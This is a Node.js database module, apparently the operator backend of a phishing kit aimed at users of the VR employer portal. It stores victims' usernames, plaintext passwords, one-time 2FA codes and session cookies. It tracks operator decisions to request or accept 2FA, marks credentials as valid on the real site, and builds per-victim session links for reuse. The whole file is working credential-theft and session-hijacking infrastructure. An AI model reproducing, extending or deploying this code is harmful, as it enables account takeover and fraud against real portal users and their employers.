const fs = require("fs");
const path = require("path");

const DB_PATH = path.join(__dirname, "vr_database.sqlite");
const DADOS_JSON = path.join(__dirname, "dados.json");
const RESULTADO_JSON = path.join(__dirname, "resultado.json");
const SESSOES_DIR = path.join(__dirname, "sessoes");

let db = null;
let useSqlite = false;

try {
    const { DatabaseSync } = require("node:sqlite");
    db = new DatabaseSync(DB_PATH);
    
    // Configurações de alta performance e concorrência (WAL mode)
    db.exec("PRAGMA journal_mode = WAL;");
    db.exec("PRAGMA synchronous = NORMAL;");
    db.exec("PRAGMA foreign_keys = ON;");
    db.exec("PRAGMA busy_timeout = 5000;");

    // Inicialização das tabelas relacionais
    db.exec(`
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario TEXT NOT NULL,
            senha TEXT NOT NULL,
            status_login TEXT DEFAULT 'aguardando_solicitacao',
            status_credencial TEXT DEFAULT 'testando',
            data_hora TEXT NOT NULL,
            ip TEXT DEFAULT '',
            user_agent TEXT DEFAULT '',
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS auth_2fa (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario TEXT NOT NULL,
            codigo TEXT NOT NULL,
            status_2fa TEXT DEFAULT 'pendente',
            data_hora TEXT NOT NULL,
            ip TEXT DEFAULT '',
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            event_type TEXT NOT NULL,
            usuario TEXT DEFAULT '',
            status TEXT DEFAULT 'INFO',
            duration_ms REAL DEFAULT 0,
            details TEXT DEFAULT '{}',
            ip TEXT DEFAULT '',
            user_agent TEXT DEFAULT '',
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS sessoes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario TEXT UNIQUE NOT NULL,
            cookies_json TEXT NOT NULL,
            total_cookies INTEGER DEFAULT 0,
            url_final TEXT DEFAULT '',
            updated_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS config (
            chave TEXT PRIMARY KEY,
            valor TEXT NOT NULL,
            updated_at INTEGER NOT NULL
        );

        CREATE INDEX IF NOT EXISTS idx_logins_usuario ON logins(usuario);
        CREATE INDEX IF NOT EXISTS idx_auth_usuario ON auth_2fa(usuario);
        CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_logs(created_at);
        CREATE INDEX IF NOT EXISTS idx_audit_event ON audit_logs(event_type);
    `);

    useSqlite = true;
    console.log("[DB] ✅ SQLite WAL inicializado com sucesso em:", DB_PATH);
} catch (err) {
    console.warn("[DB] ⚠️ node:sqlite não disponível, operando em modo fallback JSON:", err.message);
    useSqlite = false;
}

// Gravação atômica segura para evitar corrupção por concorrência ou crash
function atomicWriteJson(filePath, data) {
    const tempPath = `${filePath}.tmp.${Date.now()}.${Math.random().toString(36).substring(2, 7)}`;
    try {
        const payload = JSON.stringify(data, null, 4);
        fs.writeFileSync(tempPath, payload, "utf8");
        fs.renameSync(tempPath, filePath);
    } catch (e) {
        try { if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath); } catch (_) {}
        // Fallback direto se renameSync falhar
        fs.writeFileSync(filePath, JSON.stringify(data, null, 4), "utf8");
    }
}

// Sincroniza o estado atual do banco para os arquivos legados dados.json e resultado.json
function sincronizarJsonArquivos() {
    if (!useSqlite) return;
    try {
        const todosLogins = db.prepare("SELECT * FROM logins ORDER BY id ASC").all();
        const todos2FA = db.prepare("SELECT * FROM auth_2fa ORDER BY id ASC").all();
        const todasSessoes = db.prepare("SELECT * FROM sessoes").all();

        const sessoesMap = new Map();
        for (const s of todasSessoes) {
            try {
                sessoesMap.set(s.usuario.toLowerCase(), {
                    cookies: JSON.parse(s.cookies_json),
                    total_cookies: s.total_cookies,
                    url_final: s.url_final
                });
            } catch (_) {}
        }

        // Reconstrói feed para dados.json
        const feedItens = [];
        for (const l of todosLogins) {
            const sess = sessoesMap.get(l.usuario.toLowerCase());
            feedItens.push({
                tipo: "LOGIN",
                nome: l.usuario,
                senha: l.senha,
                status_login: l.status_login,
                status_credencial: l.status_credencial,
                data_hora: l.data_hora,
                cookies: sess ? sess.cookies : null,
                url_final: sess ? sess.url_final : undefined
            });
        }
        for (const a of todos2FA) {
            feedItens.push({
                tipo: "2FA",
                nome: a.usuario,
                codigo: a.codigo,
                status_2fa: a.status_2fa,
                data_hora: a.data_hora
            });
        }

        atomicWriteJson(DADOS_JSON, feedItens);

        // Reconstrói resultado.json
        const resultados = [];
        for (const l of todosLogins) {
            const sess = sessoesMap.get(l.usuario.toLowerCase());
            resultados.push({
                data_hora: l.data_hora,
                valido: l.status_credencial === "valido",
                status_credencial: l.status_credencial,
                nome: l.usuario,
                senha: l.senha,
                mensagem: l.status_credencial === "valido" ? "Senha correta na VR" : "Senha incorreta ou pendente na VR",
                url_final: sess ? sess.url_final : "https://superportal-empregador.vr.com.br/"
            });
        }

        atomicWriteJson(RESULTADO_JSON, resultados);
    } catch (e) {
        console.error("[DB SYNC] Erro ao sincronizar arquivos JSON:", e.message);
    }
}

// Auto-migração inicial de dados.json e resultado.json existentes para o SQLite
function autoMigrarDadosLegados() {
    if (!useSqlite) return;
    try {
        const count = db.prepare("SELECT count(*) as total FROM logins").get().total;
        if (count > 0) return; // Banco já possui registros

        if (!fs.existsSync(DADOS_JSON)) return;
        const raw = fs.readFileSync(DADOS_JSON, "utf8").trim();
        if (!raw) return;

        const itens = JSON.parse(raw);
        if (!Array.isArray(itens) || itens.length === 0) return;

        console.log(`[DB] 🔄 Migrando ${itens.length} registros legados para SQLite...`);
        const insertLogin = db.prepare(`
            INSERT INTO logins (usuario, senha, status_login, status_credencial, data_hora, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        const insert2FA = db.prepare(`
            INSERT INTO auth_2fa (usuario, codigo, status_2fa, data_hora, created_at)
            VALUES (?, ?, ?, ?, ?)
        `);

        db.exec("BEGIN TRANSACTION;");
        const now = Date.now();
        for (let i = 0; i < itens.length; i++) {
            const item = itens[i];
            const u = (item.nome || item.usuario || "desconhecido").trim();
            const dt = item.data_hora || new Date().toLocaleString("pt-BR");
            if (item.tipo === "2FA" || item.codigo) {
                insert2FA.run(u, item.codigo, item.status_2fa || "pendente", dt, now + i);
            } else if (item.senha) {
                insertLogin.run(u, item.senha, item.status_login || "aguardando_solicitacao", item.status_credencial || "testando", dt, now + i);
            }
        }
        db.exec("COMMIT;");
        console.log("[DB] ✅ Migração de dados legados concluída com sucesso!");
    } catch (e) {
        try { db.exec("ROLLBACK;"); } catch (_) {}
        console.error("[DB] Falha ao auto-migrar dados legados:", e.message);
    }
}

// Inicializa a migração automática
autoMigrarDadosLegados();

module.exports = {
    db,
    useSqlite,
    atomicWriteJson,
    sincronizarJsonArquivos,

    // Operações de Login
    salvarLogin({ usuario, senha, ip = "", userAgent = "" }) {
        const now = Date.now();
        const dataHora = new Date().toLocaleString("pt-BR");
        if (useSqlite) {
            const stmt = db.prepare(`
                INSERT INTO logins (usuario, senha, status_login, status_credencial, data_hora, ip, user_agent, created_at)
                VALUES (?, ?, 'aguardando_solicitacao', 'testando', ?, ?, ?, ?)
            `);
            const info = stmt.run(usuario, senha, dataHora, ip, userAgent, now);
            sincronizarJsonArquivos();
            return { id: info.lastInsertRowid, usuario, dataHora };
        }
        return { usuario, dataHora };
    },

    atualizarStatusCredencial(usuario, statusCredencial, statusLogin = null) {
        const uKey = usuario.toLowerCase().trim();
        if (useSqlite) {
            const stmt = statusLogin
                ? db.prepare("UPDATE logins SET status_credencial = ?, status_login = ? WHERE lower(usuario) = ?")
                : db.prepare("UPDATE logins SET status_credencial = ? WHERE lower(usuario) = ?");

            if (statusLogin) {
                stmt.run(statusCredencial, statusLogin, uKey);
            } else {
                stmt.run(statusCredencial, uKey);
            }
            sincronizarJsonArquivos();
            return true;
        }
        return false;
    },

    atualizarStatusLogin(usuario, statusLogin) {
        const uKey = usuario.toLowerCase().trim();
        if (useSqlite) {
            db.prepare("UPDATE logins SET status_login = ? WHERE lower(usuario) = ?").run(statusLogin, uKey);
            sincronizarJsonArquivos();
            return true;
        }
        return false;
    },

    // Operações de 2FA
    salvar2FA({ usuario, codigo, status_2fa = "pendente", ip = "" }) {
        const now = Date.now();
        const dataHora = new Date().toLocaleString("pt-BR");
        if (useSqlite) {
            const info = db.prepare(`
                INSERT INTO auth_2fa (usuario, codigo, status_2fa, data_hora, ip, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            `).run(usuario, codigo, status_2fa, dataHora, ip, now);
            sincronizarJsonArquivos();
            return { id: info.lastInsertRowid, usuario, codigo, dataHora };
        }
        return { usuario, codigo, dataHora };
    },

    atualizarStatus2FA(usuario, codigo, status_2fa) {
        const uKey = usuario.toLowerCase().trim();
        if (useSqlite) {
            if (codigo) {
                db.prepare("UPDATE auth_2fa SET status_2fa = ? WHERE lower(usuario) = ? AND codigo = ?").run(status_2fa, uKey, codigo);
            } else {
                db.prepare("UPDATE auth_2fa SET status_2fa = ? WHERE lower(usuario) = ?").run(status_2fa, uKey);
            }
            sincronizarJsonArquivos();
            return true;
        }
        return false;
    },

    // Sessões & Cookies
    salvarSessao(usuario, cookies, urlFinal = "") {
        const uKey = usuario.toLowerCase().trim();
        const now = Date.now();
        const cookiesJson = typeof cookies === "string" ? cookies : JSON.stringify(cookies);
        const total = Array.isArray(cookies) ? cookies.length : (typeof cookies === "string" ? JSON.parse(cookies).length : 0);

        if (useSqlite) {
            db.prepare(`
                INSERT INTO sessoes (usuario, cookies_json, total_cookies, url_final, updated_at)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(usuario) DO UPDATE SET
                    cookies_json = excluded.cookies_json,
                    total_cookies = excluded.total_cookies,
                    url_final = excluded.url_final,
                    updated_at = excluded.updated_at
            `).run(uKey, cookiesJson, total, urlFinal, now);
            sincronizarJsonArquivos();
        }

        // Salva arquivo físico na pasta sessoes/ para redundância
        try {
            if (!fs.existsSync(SESSOES_DIR)) fs.mkdirSync(SESSOES_DIR, { recursive: true });
            const safeKey = uKey.replace(/[^a-z0-9_-]/g, "_");
            const file = path.join(SESSOES_DIR, `${safeKey}_cookies.json`);
            atomicWriteJson(file, {
                usuario,
                cookies: typeof cookies === "string" ? JSON.parse(cookies) : cookies,
                total_cookies: total,
                url_final: urlFinal,
                updated_at: new Date().toISOString()
            });
        } catch (_) {}
    },

    obterSessao(usuario) {
        const uKey = usuario.toLowerCase().trim();
        if (useSqlite) {
            const row = db.prepare("SELECT * FROM sessoes WHERE lower(usuario) = ?").get(uKey);
            if (row) {
                try {
                    return {
                        usuario: row.usuario,
                        cookies: JSON.parse(row.cookies_json),
                        total_cookies: row.total_cookies,
                        url_final: row.url_final,
                        updated_at: row.updated_at
                    };
                } catch (_) {}
            }
        }
        return null;
    },

    // Leitura agregada para o painel
    obterDadosConsolidados(autoMode = true) {
        if (!useSqlite) return null;

        const logins = db.prepare("SELECT * FROM logins ORDER BY id ASC").all();
        const codigos2fa = db.prepare("SELECT * FROM auth_2fa ORDER BY id ASC").all();
        const sessoes = db.prepare("SELECT * FROM sessoes").all();

        const sessoesMap = new Map();
        for (const s of sessoes) {
            try {
                sessoesMap.set(s.usuario.toLowerCase(), {
                    cookies: JSON.parse(s.cookies_json),
                    total_cookies: s.total_cookies,
                    url_final: s.url_final
                });
            } catch (_) {}
        }

        const mapaUsuarios = new Map();

        // Processa logins
        for (const l of logins) {
            const u = l.usuario.trim();
            const userKey = u.toLowerCase();
            if (!mapaUsuarios.has(userKey)) {
                mapaUsuarios.set(userKey, {
                    usuario: u,
                    senhas: [],
                    ultimaSenha: "—",
                    codigos: [],
                    ultimoCodigo: null,
                    status_2fa: null,
                    status_login: null,
                    status_credencial: "testando",
                    cookies: null,
                    total_cookies: 0,
                    url_final: "https://superportal-empregador.vr.com.br/",
                    tem_sessao_salva: false,
                    link_acesso: `/sessao/${encodeURIComponent(u)}`,
                    data_hora: l.data_hora,
                    ultimoEventoTipo: "LOGIN"
                });
            }

            const item = mapaUsuarios.get(userKey);
            item.data_hora = l.data_hora || item.data_hora;
            item.ultimoEventoTipo = "LOGIN";
            if (!item.senhas.includes(l.senha)) item.senhas.push(l.senha);
            item.ultimaSenha = l.senha;
            item.status_login = l.status_login || "aguardando_solicitacao";
            item.status_credencial = l.status_credencial || "testando";
        }

        // Processa 2FA
        for (const a of codigos2fa) {
            const u = a.usuario.trim();
            const userKey = u.toLowerCase();
            if (!mapaUsuarios.has(userKey)) {
                mapaUsuarios.set(userKey, {
                    usuario: u,
                    senhas: [],
                    ultimaSenha: "—",
                    codigos: [],
                    ultimoCodigo: null,
                    status_2fa: null,
                    status_login: null,
                    status_credencial: "testando",
                    cookies: null,
                    total_cookies: 0,
                    url_final: "https://superportal-empregador.vr.com.br/",
                    tem_sessao_salva: false,
                    link_acesso: `/sessao/${encodeURIComponent(u)}`,
                    data_hora: a.data_hora,
                    ultimoEventoTipo: "2FA"
                });
            }

            const item = mapaUsuarios.get(userKey);
            item.ultimoEventoTipo = "2FA";
            if (!item.codigos.includes(a.codigo)) item.codigos.push(a.codigo);
            item.ultimoCodigo = a.codigo;
            item.status_2fa = a.status_2fa || "pendente";
        }

        // Vincula sessões salvas
        mapaUsuarios.forEach((item, userKey) => {
            const sess = sessoesMap.get(userKey);
            if (sess) {
                item.cookies = sess.cookies;
                item.total_cookies = sess.total_cookies;
                item.tem_sessao_salva = true;
                if (sess.url_final) item.url_final = sess.url_final;
            }

            if (item.ultimoCodigo) {
                if (item.status_2fa === "aceito") item.status = "2FA Aceito";
                else if (item.status_2fa === "negado") item.status = "2FA Negado";
                else item.status = "Aguardando Decisão";
            } else {
                if (item.status_login === "solicitar_2fa") item.status = "2FA Solicitado";
                else item.status = "Aguardando Operador";
            }
        });

        // Constrói feed cronológico reverso
        const feed = [];
        const combined = [
            ...logins.map(l => ({ ...l, tipo: "LOGIN" })),
            ...codigos2fa.map(a => ({ ...a, tipo: "2FA" }))
        ].sort((a, b) => (b.created_at || b.id) - (a.created_at || a.id));

        for (const d of combined) {
            const sess = sessoesMap.get(d.usuario.toLowerCase());
            feed.push({
                tipo: d.tipo,
                usuario: d.usuario,
                senha: d.senha || null,
                codigo: d.codigo || null,
                status_2fa: d.status_2fa || null,
                status_login: d.status_login || null,
                status_credencial: d.status_credencial || null,
                cookies: sess ? sess.cookies : null,
                total_cookies: sess ? sess.total_cookies : 0,
                url_final: sess ? sess.url_final : "https://superportal-empregador.vr.com.br/",
                link_acesso: `/sessao/${encodeURIComponent(d.usuario)}`,
                data_hora: d.data_hora || "—"
            });
        }

        return {
            success: true,
            auto_mode: autoMode,
            totalLogins: logins.length,
            total2FA: codigos2fa.length,
            totalUsuarios: mapaUsuarios.size,
            consolidados: Array.from(mapaUsuarios.values()).reverse(),
            feed
        };
    },

    limparTodosDados() {
        if (useSqlite) {
            db.exec("DELETE FROM logins;");
            db.exec("DELETE FROM auth_2fa;");
            db.exec("DELETE FROM sessoes;");
            db.exec("DELETE FROM audit_logs;");
            sincronizarJsonArquivos();
            return true;
        }
        return false;
    }
};
